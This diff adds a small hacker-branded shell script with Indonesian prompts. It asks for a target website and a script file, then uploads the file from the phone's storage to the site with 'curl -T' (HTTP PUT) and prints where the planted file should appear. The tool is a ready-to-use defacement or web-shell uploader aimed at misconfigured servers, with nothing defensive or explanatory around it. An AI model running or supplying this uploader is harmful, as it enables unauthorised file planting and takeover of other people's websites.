@@ -1,0 +1,12 @@
+cowsay -f eyes 'MR.CLAY'| lolcat
+
+figlet -f slant "Santri Gans" | lolcat
+
+read -p "Masukkan web Target kamu => " target
+
+read -p "Nama script antum => " sc;
+
+curl -T/sdcard/$sc $target
+
+echo "moga kagak beruntung:v => " $target/$sc
+
